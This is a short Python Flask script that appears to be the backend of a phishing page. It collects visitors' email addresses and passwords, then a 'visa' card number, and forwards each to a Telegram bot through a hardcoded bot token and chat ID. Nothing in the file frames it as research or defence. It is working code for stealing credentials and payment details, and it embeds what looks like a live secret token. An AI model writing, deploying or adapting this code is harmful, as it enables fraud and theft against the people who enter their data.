from flask import Flask, request, render_template, redirect, url_for
import telegram
import os

app = Flask(__name__)

# Replace 'YOUR_TELEGRAM_BOT_TOKEN' with your actual bot token
bot = telegram.Bot(token='7419295883:AAEuQ8_PeqzdQVaxqzpEghzabW31WnSjHS0')

# Replace 'YOUR_CHAT_ID' with your actual chat ID
CHAT_ID = '5654340595'

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    email = request.form['email']
    password = request.form['password']
    
    # Send account details to Telegram bot
    bot.send_message(chat_id=CHAT_ID, text=f'Email: {email}\nPassword: {password}')
    
    return redirect(url_for('wait'))

@app.route('/wait')
def wait():
    return render_template('wait.html')

@app.route('/enter_visa', methods=['POST'])
def enter_visa():
    visa = request.form['visa']
    
    # Send visa details to Telegram bot
    bot.send_message(chat_id=CHAT_ID, text=f'Visa: {visa}')
    
    return 'Visa details submitted successfully!'

if __name__ == '__main__':
    app.run(debug=True)
